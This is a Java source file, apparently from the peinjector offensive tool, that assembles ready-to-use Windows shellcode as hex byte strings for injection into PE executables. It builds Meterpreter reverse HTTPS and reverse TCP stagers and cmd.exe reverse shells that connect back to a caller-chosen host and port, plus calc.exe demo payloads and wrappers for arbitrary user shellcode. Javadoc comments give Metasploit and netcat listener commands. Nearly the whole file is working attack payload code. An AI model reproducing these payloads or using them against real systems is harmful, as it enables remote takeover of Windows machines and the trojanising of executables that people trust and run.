package eu.peinjector.libpe;

import java.io.ByteArrayOutputStream;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import javax.xml.bind.DatatypeConverter;

/*
	Copyright (c) 2013-2015, Joshua Pitts
	All rights reserved.
	
	Redistribution and use in source and binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	
	    1. Redistributions of source code must retain the above copyright notice,
	    this list of conditions and the following disclaimer.
	
	    2. Redistributions in binary form must reproduce the above copyright notice,
	    this list of conditions and the following disclaimer in the documentation
	    and/or other materials provided with the distribution.
	
	    3. Neither the name of the copyright holder nor the names of its contributors
	    may be used to endorse or promote products derived from this software without
	    specific prior written permission.
	
	THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
	AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
	IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
	ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
	LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
	CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
	SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
	INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
	CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
	ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
	POSSIBILITY OF SUCH DAMAGE.
*/

/**
 * This class provides shellcode factories
 */
public class LibPeShellcodeFactory {

	
	// general methods
	// ------------------------------------------------------------------------------
	/**
	 * Returns the raw IP address of this InetAddress object. 
	 * The result is in network byte order: the highest order byte of the address is in getAddress()[0].
	 * 
	 * <p>resolve hostnames!!!</p>
	 * 
	 * @return an IP address for the given host name. 
	 */
	private static byte[] pack_ip_addresses(String ip) {
		try {
			InetAddress ia_ip = InetAddress.getByName(ip);
			byte[] bytes = ia_ip.getAddress();
			return bytes;
			
		} catch (UnknownHostException e) {
			e.printStackTrace();
			return new byte[4];
		}
	}
	
	/**
	 * convert the port into byte-array<br>
	 * network (= big-endian)<br>
	 * unsigned short (2byte)
	 */
	private static byte[] pack_port(int port, ByteOrder bo) {
		byte[] tmp = ByteBuffer.allocate(4).order(bo).putInt(port).array();
		if(ByteOrder.BIG_ENDIAN == bo) {
			return new byte[] {tmp[2],tmp[3]};
		}else {
			return new byte[] {tmp[0],tmp[1]};
		}
	}
		

	// shellcode
	// ------------------------------------------------------------------------------
	/**
	 * <p>Traditional meterpreter reverse https shellcode. Will try to connect to the given host:port. 
	 * Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel 
	 * communication over HTTPS (Windows wininet) The port must be between 1 and 65535.</p>
	 * 
	 * <p><u>references</u><br>
	 * https://github.com/stephenfewer/ReflectiveDLLInjection<br>
	 * https://github.com/rapid7/ReflectiveDLLInjection</p>
	 * 
	 * <p><u>listen commands</u><br>
	 * msf > use payload/windows/meterpreter/reverse_https<br>
	 * msf payload(reverse_https) > set lhost 0.0.0.0<br>
	 * msf payload(reverse_https) > set lport 1337<br>
	 * msf payload(reverse_https) > run</p>
	 * 
	 * (for 32bit OS)
	 * 
	 * @param host ip or hostname
	 * @param port Port
	 */
	public static byte[] meterpreter_reverse_https_threaded_x86(String host, int port) {
		// params
		byte[] port_byte = pack_port(port, ByteOrder.LITTLE_ENDIAN);

		try {
			// ByteArrayOutputStream
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode1 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode2 = new ByteArrayOutputStream();

			// shellcode2
			shellcode2.write(DatatypeConverter.parseHexBinary("E8B7FFFFFFfce8890000006089e531d2648b52308b520c8b52148b72"
					+ "280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b5820"
					+ "01d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b04"
					+ "8b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6954684c772607ffd531ff575757576a00"
					+ "54683a5679a7ffd5eb5f5b31c951516a03515168"));
			shellcode2.write(port_byte); // PORT
			shellcode2.write(DatatypeConverter.parseHexBinary("000053506857899fc6ffd5eb485931d252680032a084525252515250"
					+ "68eb552e3bffd589c66a105b688033000089e06a04506a1f566875469e86ffd531ff5757575756682d06187bffd585c0"
					+ "751a4b7410ebd5eb49e8b3ffffff2f48455679000068f0b5a256ffd56a4068001000006800004000576858a453e5ffd5"
					+ "93535389e7576800200000535668129689e2ffd585c074cd8b0701c385c075e558c3e851ffffff"));
			shellcode2.write(host.getBytes()); // HOST
			shellcode2.write(DatatypeConverter.parseHexBinary("00"));

			// shellcode1 is the thread
			shellcode1.write(DatatypeConverter.parseHexBinary("9090609CFC90E8C10000006089E531D290648B52308B520C8B5214EB"
					+ "0241108B72280FB74A2631FF31C0AC3C617C022C20C1CF0D01C74975EF5290578B5210908B423C01D0908B4078EB07EA"
					+ "484204857C3A85C00F84680000009001D050908B48188B582001D3E358498B348B01D631FF9031C0EB04FF69D538ACC1"
					+ "CF0D01C738E0EB057F1BD2EBCA75E6037DF83B7D2475D458908B582401D390668B0C4B8B581C01D390EB04CD97F1B18B"
					+ "048B01D090894424245B5B6190595A51EB010FFFE058905F5A8B12E953FFFFFF905D90BE"));
			shellcode1.write(pack_port(shellcode2.size()-5, ByteOrder.LITTLE_ENDIAN));
			shellcode1.write(DatatypeConverter.parseHexBinary("0000906A4090680010000056906A006858A453E5FFD589C389C79089"
					+ "F1eb44905e909090F2A4E820000000BBE01D2A0A9068A695BD9DFFD53C067C0A80FBE07505BB4713726F6A0053FFD531"
					+ "C05050505350506838680D16FFD558589061E9"));
			shellcode1.write(ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(shellcode2.size()).array());

			// return shellcode
			shellcode.write(shellcode1.toByteArray());
			shellcode.write(shellcode2.toByteArray());
			return shellcode.toByteArray();

		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	/**
	 * <p>Traditional meterpreter reverse https shellcode. Will try to connect to the given host:port. 
	 * Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel 
	 * communication over HTTPS (Windows wininet) The port must be between 1 and 65535.</p>
	 * 
	 * <p><u>references</u><br>
	 * https://github.com/stephenfewer/ReflectiveDLLInjection<br>
	 * https://github.com/rapid7/ReflectiveDLLInjection</p>
	 * 
	 * <p><u>listen commands</u><br>
	 * msf > use payload/windows/meterpreter/reverse_https<br>
	 * msf payload(reverse_https) > set lhost 0.0.0.0<br>
	 * msf payload(reverse_https) > set lport 1337<br>
	 * msf payload(reverse_https) > run</p>
	 * 
	 * (for 64bit OS)
	 * 
	 * @param host ip or hostname
	 * @param port Port
	 */
	public static byte[] meterpreter_reverse_https_threaded_x64(String host, int port) {
		// params
		byte[] port_byte = pack_port(port, ByteOrder.LITTLE_ENDIAN);

		try {
			// ByteArrayOutputStream
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode1 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode2 = new ByteArrayOutputStream();

			// shellcode2
			shellcode2.write(DatatypeConverter.parseHexBinary("E8B8FFFFFFfc4883e4f0e8c8000000415141505251564831d265488b" +
					"5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b" +
					"423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801" +
					"d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0" +
					"418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e69" +
					"6e65740041564989e64c89f149ba4c77260700000000ffd56a006a004889e14831d24d31c04d31c94150415049ba3a5679" +
					"a700000000ffd5e99e0000005a4889c149b8"));
			shellcode2.write(port_byte); // PORT
			shellcode2.write(DatatypeConverter.parseHexBinary("0000000000004d31c9415141516a03415149ba57899fc600000000ff" +
					"d5eb7c4889c14831d241584d31c952680032a084525249baeb552e3b00000000ffd54889c66a0a5f4889f148ba1f000000" +
					"000000006a0068803300004989e049b9040000000000000049ba75469e8600000000ffd54889f14831d24d31c04d31c952" +
					"5249ba2d06187b00000000ffd585c0752448ffcf7413ebb1e981000000e87fffffff2f75474858000049bef0b5a2560000" +
					"0000ffd54831c948ba000040000000000049b8001000000000000049b9400000000000000049ba58a453e500000000ffd5" +
					"489353534889e74889f14889da49b800200000000000004989f949ba129689e200000000ffd54883c42085c07499488b07" +
					"4801c34885c075ce5858c3e8d7feffff"));
			shellcode2.write(host.getBytes()); // HOST
			shellcode2.write(DatatypeConverter.parseHexBinary("00"));
			
			//shellcode1 is the thread
			shellcode1.write(DatatypeConverter.parseHexBinary("9050535152565755415041514152415341544155415641579c90e8c0" +
					"000000415141505251564831D265488B5260488B5218488B5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041" +
					"c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648" +
					"ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c" +
					"48448b401c4901d0418b04884801d0415841585E595A41584159415A4883EC204152FFE05841595A488B12e957ffffff5d" +
					"49c7c6"));
			shellcode1.write(pack_port(shellcode2.size()-5, ByteOrder.LITTLE_ENDIAN));
			shellcode1.write(DatatypeConverter.parseHexBinary("00006a404159680010000041584C89F26A00596858a453e5415Affd5" +
					"4889c34889c748c7c1"));
			shellcode1.write(pack_port(shellcode2.size()-5, ByteOrder.LITTLE_ENDIAN));
			shellcode1.write(DatatypeConverter.parseHexBinary("0000eb435ef2a4e8000000004831C050504989C14889C24989D84889" +
					"C149C7C238680D16FFD54883C4589d415f415e415d415c415b415a415941585d5f5e5a595b58E9"));
			shellcode1.write(ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(shellcode2.size()).array());
			
			// return shellcode
			shellcode.write(shellcode1.toByteArray());
			shellcode.write(shellcode2.toByteArray());
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}

	/**
	 * <p>Reverse tcp stager which will try to connect to the given host:port. 
	 * Can be used with windows/shell/reverse_tcp or windows/meterpreter/reverse_tcp 
	 * payloads from metasploit. Host must be an IPv4 address, the port must be between 1 and 65535.</p>
	 * 
	 * <p><u>references</u><br>
	 * https://github.com/stephenfewer/ReflectiveDLLInjection<br>
	 * https://github.com/rapid7/ReflectiveDLLInjection</p>
	 * 
	 * <p><u>listen commands</u><br>
	 * msf > use payload/windows/meterpreter/reverse_tcp<br>
	 * msf payload(reverse_tcp) > set lhost 0.0.0.0<br>
	 * msf payload(reverse_tcp) > set lport 1337<br>
	 * msf payload(reverse_tcp) > run</p>
	 * 
	 * (for 32bit OS)
	 * 
	 * @param ip ipv4 address
	 * @param port Port
	 */
	public static byte[] reverse_tcp_stager_threaded_x86(String ip, int port) {
		// params
		byte[] ip_byte = pack_ip_addresses(ip);
		byte[] port_byte = pack_port(port, ByteOrder.BIG_ENDIAN);
		
		// shellcode
		try {
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			shellcode.write(DatatypeConverter.parseHexBinary("9090609cfc90e8c10000006089e531d290648b52308b520c8b5214eb0"
					+ "241108b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef5290578b5210908b423c01d0908b4078eb07ea4"
					+ "84204857c3a85c00f84680000009001d050908b48188b582001d3e358498b348b01d631ff9031c0eb04ff69d538acc1c"
					+ "f0d01c738e0eb057f1bd2ebca75e6037df83b7d2475d458908b582401d390668b0c4b8b581c01d390eb04cd97f1b18b0"
					+ "48b01d090894424245b5b6190595a51eb010fffe058905f5a8b12e953ffffff905d90be22010000906a4090680010000"
					+ "056906a006858a453e5ffd589c389c79089f1eb44905e909090f2a4e820000000bbe01d2a0a9068a695bd9dffd53c067"
					+ "c0a80fbe07505bb4713726f6a0053ffd531c05050505350506838680d16ffd558589061e927010000e8b7fffffffce88"
					+ "90000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b521"
					+ "08b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df"
					+ "83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d68333"
					+ "20000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976"
					+ "a0568"));
			shellcode.write(ip_byte);	//ip
			shellcode.write(DatatypeConverter.parseHexBinary("680200"));
			shellcode.write(port_byte);	//port
			shellcode.write(DatatypeConverter.parseHexBinary("89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd"
					+ "56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c"
					+ "329c685f675ecc3"));
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	/**
	 * <p>Reverse tcp stager which will try to connect to the given host:port. 
	 * Can be used with windows/shell/reverse_tcp or windows/meterpreter/reverse_tcp 
	 * payloads from metasploit. Host must be an IPv4 address, the port must be between 1 and 65535.</p>
	 * 
	 * <p><u>references</u><br>
	 * https://github.com/stephenfewer/ReflectiveDLLInjection<br>
	 * https://github.com/rapid7/ReflectiveDLLInjection</p>
	 * 
	 * <p><u>listen commands</u><br>
	 * msf > use payload/windows/meterpreter/reverse_tcp<br>
	 * msf payload(reverse_tcp) > set lhost 0.0.0.0<br>
	 * msf payload(reverse_tcp) > set lport 1337<br>
	 * msf payload(reverse_tcp) > run</p>
	 * 
	 * (for 64bit OS)
	 * 
	 * @param ip ipv4 address
	 * @param port Port
	 */
	public static byte[] reverse_tcp_stager_threaded_x64(String ip, int port) {
		// params
		byte[] ip_byte = pack_ip_addresses(ip);
		byte[] port_byte = pack_port(port, ByteOrder.BIG_ENDIAN);
		
		// shellcode
		try {
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			shellcode.write(DatatypeConverter.parseHexBinary("9050535152565755415041514152415341544155415641579c90e8c00"
					+ "00000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c204"
					+ "1c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35"
					+ "648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d0664"
					+ "18b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957f"
					+ "fffff5d49c7c6a60100006a404159680010000041584c89f26a00596858a453e5415affd54889c34889c748c7c1a6010"
					+ "000eb435ef2a4e8000000004831c050504989c14889c24989d84889c149c7c238680d16ffd54883c4589d415f415e415"
					+ "d415c415b415a415941585d5f5e5a595b58e9ab010000e8b8fffffffc4883e4f0e8c0000000415141505251564831d26"
					+ "5488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488"
					+ "b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c"
					+ "94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b0"
					+ "4884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000"
					+ "041564989e64881eca00100004989e549bc0200"));
			shellcode.write(port_byte);	//port
			shellcode.write(ip_byte);	//ip
			shellcode.write(DatatypeConverter.parseHexBinary("41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba298"
					+ "06b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba9"
					+ "9a57461ffd54881c4400200004883ec104889e24d31c96a0441584889f941ba02d9c85fffd54883c4205e6a404159680"
					+ "010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd54801c"
					+ "34829c64885f675e141ffe7"));
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	/**
	 * <p>reverse shell</p>
	 * <p>Spawns a reverse shell (Windows cmd, via tcp) which will try to connect to the 
	 * given host:port. Host must be an IPv4 address, the port must be between 1 and 65535.</p>
	 * 
	 * <p>listen command<br>
	 * nc -lvp 1337</p>
	 * 
	 * <p><u>alternativ listen command</u><br>
	 * use payload/windows/shell_reverse_tcp<br>
	 * msf payload(shell_reverse_tcp) > set lhost 0.0.0.0<br>
	 * msf payload(shell_reverse_tcp) > set lport 1337<br>
	 * msf payload(shell_reverse_tcp) > run</p>
	 * 
	 * (for 32bit OS)
	 * 
	 * @param ip ipv4 address
	 * @param port Port
	 */
	public static byte[] reverse_shell_tcp_x86(String ip, int port) {
		// params
		byte[] ip_byte = pack_ip_addresses(ip);
		byte[] port_byte = pack_port(port, ByteOrder.BIG_ENDIAN);
		
		// shellcode
		try {
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			shellcode.write(DatatypeConverter.parseHexBinary("9090609cfce8890000006089e531d2648b52308b520c8b52148b72280"
					+ "fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b58200"
					+ "1d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b0"
					+ "48b01d0894424245b5b61595a51ffe0585f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c"
					+ "454506829806b00ffd5505050504050405068ea0fdfe0ffd589c768"));
			shellcode.write(ip_byte);	//ip
			shellcode.write(DatatypeConverter.parseHexBinary("680200"));
			shellcode.write(port_byte);	//port
			shellcode.write(DatatypeConverter.parseHexBinary("89e66a1056576899a57461ffd568636d640089e357575731f66a12595"
					+ "6e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e9046ff306808871d60f"
					+ "fd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a005381c4fc0100009d61"));
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}

	/**
	 * <p>reverse shell</p>
	 * <p>Spawns a reverse shell (Windows cmd, via tcp) which will try to connect to the 
	 * given host:port. Host must be an IPv4 address, the port must be between 1 and 65535.</p>
	 * 
	 * <p>listen command<br>
	 * nc -lvp 1337</p>
	 * 
	 * <p><u>alternativ listen command</u><br>
	 * use payload/windows/shell_reverse_tcp<br>
	 * msf payload(shell_reverse_tcp) > set lhost 0.0.0.0<br>
	 * msf payload(shell_reverse_tcp) > set lport 1337<br>
	 * msf payload(shell_reverse_tcp) > run</p>
	 * 
	 * (for 64bit OS)
	 * 
	 * @param ip ipv4 address
	 * @param port Port
	 */
	public static byte[] reverse_shell_tcp_x64(String ip, int port) {
		// params
		byte[] ip_byte = pack_ip_addresses(ip);
		byte[] port_byte = pack_port(port, ByteOrder.BIG_ENDIAN);
		
		// shellcode
		try {
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			shellcode.write(DatatypeConverter.parseHexBinary("90905053515256575455415041514152415341544155415641579cfc4"
					+ "883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3"
					+ "c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b4"
					+ "0204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b4"
					+ "0244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595"
					+ "a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200"));
			shellcode.write(port_byte);	//port
			shellcode.write(ip_byte);	//ip
			shellcode.write(DatatypeConverter.parseHexBinary("41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba298"
					+ "06b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba9"
					+ "9a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540"
					+ "101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d290909"
					+ "08b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189da4"
					+ "881c4f80000009d415f415e415d415c415b415a415941585d5c5f5e5a595b58"));
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	
	/**
	 * Injects a classic execute calc.exe shellcode
	 * (for 32bit OS)
	 */
	public static byte[] demo_calc_x86() {
		return DatatypeConverter.parseHexBinary("31d2526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f78"
				+ "8b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7");
	}
	
	
	
	/**
	 * Injects a classic execute calc.exe shellcode
	 * (for 64bit OS)
	 */
	public static byte[] demo_calc_x64() {
		return DatatypeConverter.parseHexBinary("505152535657556a605a6863616c6354594883ec2865488b32488b7618488b761048ad"
				+ "488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b"
				+ "34ae4801f799ffd74883c4305d5f5e5b5a5958");
	}
	
	/**
	 * Injects a NOP (Debugging purposes) 
	 * (for 32bit and 64bit OS)
	 * 
	 * @param repeats number of nop's
	 */
	public static byte[] demo_nop(int repeats) {
		// nop's
		StringBuilder sb = new StringBuilder();
		for(int i=0; i<repeats; i++) {
			sb.append("90");
		}
		
		//return shellcode
		return DatatypeConverter.parseHexBinary(sb.toString());
	}

	/**
	 * User supplied shellcode. Just paste shellcode as hex string
	 * (for 32bit ans 64bit OS)
	 * 
	 * @param hex_string_shellcode
	 */
	public static byte[] user_supplied_shellcode(String hex_string_shellcode) {
		// null not allowed
		if(null == hex_string_shellcode) {
			hex_string_shellcode = "";
		}
		
		// filter bad chars
		hex_string_shellcode = hex_string_shellcode.toLowerCase();
		hex_string_shellcode = hex_string_shellcode.replaceAll("[^0-9a-f]", "");
		
		// return shellcode
		return DatatypeConverter.parseHexBinary(hex_string_shellcode);
	}

	/**
	 * User supplied shellcode. Just paste shellcode as hex string. It will be injected as new thread. 
	 * Make sure to use a process safe exit function.
	 * 
	 * (for 32bit OS)
	 * 
	 * @param hex_string_shellcode
	 */
	public static byte[] user_supplied_shellcode_threaded_x86(String hex_string_shellcode) {
		// usershellcode
		byte[] usershellcode = user_supplied_shellcode(hex_string_shellcode);
		
		try {
			// ByteArrayOutputStream
			ByteArrayOutputStream shellcode1 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode2 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			
			// shellcode2
	        shellcode2.write(DatatypeConverter.parseHexBinary("E8B7FFFFFF"));
	        shellcode2.write(usershellcode);

	        // shellcode1
			shellcode1.write(DatatypeConverter.parseHexBinary("9090609CFC"
					+ "90E8C10000006089E531D290648B52308B520C8B5214EB0241108B72280FB74A2631FF31C0AC3C617C022C20C1CF0D01"
					+ "C74975EF5290578B5210908B423C01D0908B4078EB07EA484204857C3A85C00F84680000009001D050908B48188B5820"
					+ "01D3E358498B348B01D631FF9031C0EB04FF69D538ACC1CF0D01C738E0EB057F1BD2EBCA75E6037DF83B7D2475D45890"
					+ "8B582401D390668B0C4B8B581C01D390EB04CD97F1B18B048B01D090894424245B5B6190595A51EB010FFFE058905F5A"
					+ "8B12E953FFFFFF905D90BE"));
			shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() - 5 ).array());
	        shellcode1.write(DatatypeConverter.parseHexBinary("906A4090680010000056906A006858A453E5FFD589C389C79089F1eb"
	        		+ "44905e909090F2A4E820000000BBE01D2A0A9068A695BD9DFFD53C067C0A80FBE07505BB4713726F6A0053FFD531C050"
	        		+ "50505350506838680D16FFD558589061e9"));
	        shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() ).array());
	        	
	        // return shellcode
	        shellcode.write(shellcode1.toByteArray());
	        shellcode.write(shellcode2.toByteArray());
			return shellcode.toByteArray();
				
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	/**
	 * User supplied shellcode. Just paste shellcode as hex string. It will be injected as new thread. 
	 * Make sure to use a process safe exit function
	 * 
	 * (for 64bit OS)
	 * 
	 * @param hex_string_shellcode
	 */
	public static byte[] user_supplied_shellcode_threaded_x64(String hex_string_shellcode) {
		// usershellcode
		byte[] usershellcode = user_supplied_shellcode(hex_string_shellcode);
		
		try {
			// ByteArrayOutputStream
			ByteArrayOutputStream shellcode1 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode2 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			
			// shellcode2
	        shellcode2.write(DatatypeConverter.parseHexBinary("E8B8FFFFFF"));
	        shellcode2.write(usershellcode);
			
	        // shellcode1
			shellcode1.write(DatatypeConverter.parseHexBinary("9050535152565755415041514152415341544155415641579c90e8c0"
					+ "000000415141505251564831D265488B5260488B5218488B5220488b7250480fb74a4a4d31c94831c0ac3c617c022c20"
					+ "41c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e3"
					+ "5648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066"
					+ "418b0c48448b401c4901d0418b04884801d0415841585E595A41584159415A4883EC204152FFE05841595A488B12e957"
					+ "ffffff5d49c7c6"));
			shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() - 5 ).array());
	        shellcode1.write(DatatypeConverter.parseHexBinary("6a404159680010000041584C89F26A00596858a453e5415Affd54889"
	        		+ "c34889c748c7c1"));
	        shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() - 5 ).array());
	        shellcode1.write(DatatypeConverter.parseHexBinary("eb435ef2a4e8000000004831C050504989C14889C24989D84889C149"
	        		+ "C7C238680D16FFD54883C4589d415f415e415d415c415b415a415941585d5f5e5a595b58e9"));
	        shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() ).array());
	        	
	        // return shellcode
	        shellcode.write(shellcode1.toByteArray());
	        shellcode.write(shellcode2.toByteArray());
			return shellcode.toByteArray();
				
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}

}
